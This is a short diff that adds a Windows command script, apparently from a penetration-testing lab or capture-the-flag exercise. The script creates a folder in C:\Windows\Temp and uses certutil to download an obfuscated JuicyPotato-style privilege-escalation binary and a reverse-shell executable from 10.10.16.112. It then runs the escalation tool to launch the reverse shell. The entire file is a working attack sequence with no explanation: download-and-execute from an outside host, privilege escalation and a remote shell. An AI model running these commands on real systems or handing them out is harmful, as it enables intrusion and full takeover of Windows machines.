@@ -1,0 +1,10 @@
+cd C:\Windows\Temp
+mkdir C:\Windows\Temp\test
+cd C:\Windows\Temp\test
+
+
+certutil -urlcache -split -f http://10.10.16.112/EbowlaJuicy.exe juicy.exe
+
+certutil -urlcache -split -f http://10.10.16.112/reverseShell.exe exploit.exe
+
+cmd /c juicy.exe -l 1111 -p C:\Windows\Temp\test\exploit.exe -t *
